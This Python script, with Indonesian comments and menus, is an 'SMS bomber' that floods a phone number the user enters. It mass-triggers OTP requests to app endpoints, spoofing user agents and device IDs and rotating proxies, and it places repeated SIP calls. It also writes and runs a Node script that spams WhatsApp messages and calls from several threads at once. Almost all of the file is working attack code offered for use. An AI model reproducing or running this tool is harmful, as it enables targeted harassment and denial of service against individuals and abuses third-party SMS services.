#!/usr/bin/env python3
"""
MR414N MULTI-CHANNEL BOMBER — SINGLE FILE
Banner MR414N + menu spam SMS + input target interaktif.
"""

import requests, threading, time, random, json, os, sys, logging, subprocess, tempfile
from datetime import datetime

# ============================================================
# KONFIG
# ============================================================
THREADS_PER_CHANNEL = 5
LOOP_PER_THREAD     = 5
LOG_FILE            = "bomber.log"

SMS_ENDPOINTS = [
    {
        "url": "https://api-app1.example.com/api/v1/auth/send-otp",
        "method": "POST",
        "headers": {"User-Agent": "okhttp/4.9.0", "Content-Type": "application/json"},
        "body": {"phone": "6281234567890", "method": "sms"}
    },
    {
        "url": "https://api-app2.example.com/v2/auth/otp",
        "method": "POST",
        "headers": {"User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11)",
                    "Content-Type": "application/x-www-form-urlencoded"},
        "body": {"msisdn": "6281234567890"}
    },
    # tambah app lain di sini...
]

PROXIES = [
    # "http://user:pass@1.2.3.4:8080",
]

SIP_ID_URI    = "sip:user@provider.sip"
SIP_REGISTRAR = "sip:provider.sip"
SIP_USER      = "user"
SIP_PASS      = "password"
SIP_DOMAIN    = "provider.sip"

# ============================================================
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.FileHandler(LOG_FILE, encoding="utf-8"),
              logging.StreamHandler(sys.stdout)],
)
log = logging.getLogger("bomber")

# ============================================================
# BANNER
# ============================================================
BANNER = r"""
 ███▄ ▄███▓ ██▀███   ██▄████▄ ██▓ ██▓    ▄▄▄       ███▄    █
▓██▒▀█▀ ██▒▓██ ▒ ██▒ ██▀   ▀ ▓██▒▓██▒   ▒████▄     ██ ▀█   █
▓██    ▓██░▓██ ░▄█ ▒ ██      ▒██▒▒██░   ▒██  ▀█▄  ▓██  ▀█ ██▒
▒██    ▒██ ▒██▀▀█▄   ██      ░██░░██░   ░██▄▄▄▄██ ▓██▒  ▐▌██▒
▒██▒   ░██▒░██▓ ▒██▒ ░██▄▄▄▄██░██░ ██░   ▓█   ▓██▒▒██░   ▓██░
░ ▒░   ░  ░░ ▒▓ ░▒▓░  ▓█   ▓██░░ ░  ░    ▒▒   ▓▒█░░ ▒░   ▒ ▒
░  ░      ░  ░▒ ░ ▒░  ▒▒   ▓▒█░           ▒   ▒▒ ░░ ░░   ░ ▒░
░      ░     ░░   ░    ▒   ▒▒ ░           ░   ▒      ░   ░ ░
       ░      ░        ░   ▒                  ░  ░         ░
"""

SUB = r"""
   ┌──────────────────────────────────────────┐
   │            S P A M   S M S               │
   │       multi-channel bomber v1.0          │
   └──────────────────────────────────────────┘
"""

def tampil_banner():
    os.system("cls" if os.name == "nt" else "clear")
    print(BANNER)
    print(SUB)
    print("   ─────────────────────────────────────────────")
    print("   Channel: [SMS OTP] [TELPON] [WA CHAT] [WA CALL]")
    print("   ─────────────────────────────────────────────\n")

# ============================================================
# NODE WA script — ditulis otomatis
# ============================================================
WA_SENDER_JS = r'''
const { Client } = require('whatsapp-web.js');
const qrcode = require('qrcode-terminal');
const nomor = process.argv[2];
const pesan = process.argv[3] || "spam";
const mode  = process.argv[4] || "chat";
const client = new Client({ puppeteer: { headless: true,
    args: ['--no-sandbox','--disable-setuid-sandbox'] } });
client.on('qr', qr => qrcode.generate(qr, { small: true }));
client.on('ready', async () => {
    const chatId = nomor + '@c.us';
    try {
        if (mode === "call") { await client.call(chatId); console.log('[OK] call'); }
        else { await client.sendMessage(chatId, pesan); console.log('[OK] sent'); }
    } catch (e) { console.log('[ERR]', e.message); }
    setTimeout(() => client.destroy(), 4000);
});
client.initialize();
'''

def ensure_node_script():
    path = os.path.join(tempfile.gettempdir(), "mr414n_wa.js")
    if not os.path.exists(path):
        with open(path, "w", encoding="utf-8") as f:
            f.write(WA_SENDER_JS)
    return path

WA_JS_PATH = ensure_node_script()

# ============================================================
# MODUL
# ============================================================
UAS = ["okhttp/4.9.0", "okhttp/4.10.0",
       "Dalvik/2.1.0 (Linux; U; Android 11; SM-A515F)",
       "Mozilla/5.0 (Linux; Android 10)"]

NOMOR_TARGET = ""

def sms_otp_worker(tid):
    for ep in SMS_ENDPOINTS:
        url = ep["url"]; method = ep.get("method","POST").upper()
        base_h = dict(ep.get("headers", {})); body = dict(ep.get("body", {}))
        for k, v in list(body.items()):
            if isinstance(v, str) and "6281234567890" in v:
                body[k] = v.replace("6281234567890", NOMOR_TARGET)
        for i in range(LOOP_PER_THREAD):
            h = dict(base_h)
            h["User-Agent"] = random.choice(UAS)
            h["X-Device-ID"] = "android-" + "".join(
                random.choices("0123456789abcdef", k=16))
            proxy = None
            if PROXIES:
                p = random.choice(PROXIES); proxy = {"http": p, "https": p}
            try:
                ct = h.get("Content-Type","").lower()
                if method == "POST":
                    r = (requests.post(url, json=body, headers=h, proxies=proxy, timeout=8)
                         if "application/json" in ct else
                         requests.post(url, data=body, headers=h, proxies=proxy, timeout=8))
                else:
                    r = requests.get(url, params=body, headers=h, proxies=proxy, timeout=8)
                log.info(f"[SMS-T{tid}] {url} #{i+1} -> {r.status_code}")
            except Exception as e:
                log.warning(f"[SMS-T{tid}] {url} #{i+1} gagal: {e}")
            time.sleep(random.uniform(0.1, 0.4))

def telpon_worker(tid):
    try:
        import pjsua2 as pj
    except ImportError:
        log.error("[TELPON] pjsua2 belum ada — skip")
        return
    class Call(pj.Call):
        def __init__(self, acc, target, tid, idx):
            pj.Call.__init__(self, acc); self.target=target; self.tid=tid; self.idx=idx
        def onCallState(self, prm):
            ci = self.getInfo()
            log.info(f"[TELPON-T{self.tid}] #{self.idx} -> {ci.stateText}")
    ep = pj.Endpoint(); ep.libCreate(); ep.libInit(pj.EpConfig())
    ep.transportCreate(pj.PJSIP_TRANSPORT_UDP, pj.TransportConfig())
    acc_cfg = pj.AccountConfig()
    acc_cfg.idUri = SIP_ID_URI
    acc_cfg.regConfig.registrarUri = SIP_REGISTRAR
    acc_cfg.sipConfig.authCreds.append(pj.AuthCreds())
    acc_cfg.sipConfig.authCreds[0].realm = "*"
    acc_cfg.sipConfig.authCreds[0].scheme = "digest"
    acc_cfg.sipConfig.authCreds[0].username = SIP_USER
    acc_cfg.sipConfig.authCreds[0].data = SIP_PASS
    acc = pj.Account(); acc.create(acc_cfg); ep.libStart()
    for i in range(LOOP_PER_THREAD):
        try:
            call = Call(acc, NOMOR_TARGET, tid, i+1)
            prm = pj.CallOpParam(); prm.opt.audioCount=1; prm.opt.videoCount=0
            call.makeCall(f"sip:{NOMOR_TARGET}@{SIP_DOMAIN}", prm)
            time.sleep(1.5)
        except Exception as e:
            log.warning(f"[TELPON-T{tid}] #{i+1} gagal: {e}")
    ep.libDestroy()

def wa_chat_worker(tid):
    for i in range(LOOP_PER_THREAD):
        try:
            subprocess.run(["node", WA_JS_PATH, NOMOR_TARGET,
                            f"spam #{i+1} from T{tid}", "chat"],
                           capture_output=True, timeout=30)
            log.info(f"[WA-CHAT-T{tid}] #{i+1} done")
        except Exception as e:
            log.warning(f"[WA-CHAT-T{tid}] #{i+1} gagal: {e}")
        time.sleep(random.uniform(1.0, 2.0))

def wa_call_worker(tid):
    for i in range(LOOP_PER_THREAD):
        try:
            subprocess.run(["node", WA_JS_PATH, NOMOR_TARGET, "", "call"],
                           capture_output=True, timeout=30)
            log.info(f"[WA-CALL-T{tid}] #{i+1} done")
        except Exception as e:
            log.warning(f"[WA-CALL-T{tid}] #{i+1} gagal: {e}")
        time.sleep(2.0)

# ============================================================
# MENU & INPUT
# ============================================================
def menu_channel():
    print("   pilih channel:")
    print("   [1] spam SMS OTP")
    print("   [2] telpon seluler (SIP)")
    print("   [3] WA chat")
    print("   [4] WA call")
    print("   [5] SEMUA channel (brutal)")
    print()
    p = input("   pilihan > ").strip()
    return {"1":"sms","2":"telpon","3":"wa_chat","4":"wa_call","5":"all"}.get(p,"all")

def main():
    global NOMOR_TARGET
    tampil_banner()

    print("   masukan nomor target (contoh: 6281234567890)")
    NOMOR_TARGET = input("   target > ").strip()
    if not NOMOR_TARGET:
        print("   [!] target kosong, keluar.")
        return
    print()

    chan = menu_channel()
    print()
    print(f"   [*] target : {NOMOR_TARGET}")
    print(f"   [*] channel: {chan}")
    print(f"   [*] mulai  : {datetime.now().strftime('%H:%M:%S')}")
    print("   " + "─"*45)
    time.sleep(1)

    threads = []
    for i in range(THREADS_PER_CHANNEL):
        if chan in ("sms","all"):
            threads.append(threading.Thread(target=sms_otp_worker, args=(i,)))
        if chan in ("telpon","all"):
            threads.append(threading.Thread(target=telpon_worker, args=(i,)))
        if chan in ("wa_chat","all"):
            threads.append(threading.Thread(target=wa_chat_worker, args=(i,)))
        if chan in ("wa_call","all"):
            threads.append(threading.Thread(target=wa_call_worker, args=(i,)))

    log.info(f"spawn {len(threads)} thread × {LOOP_PER_THREAD} loop")
    start = time.time()
    for t in threads: t.start()
    for t in threads: t.join()
    print("   " + "─"*45)
    print(f"   [*] selesai {time.time()-start:.1f}s — log: {LOG_FILE}")
    print()

if __name__ == "__main__":
    main()
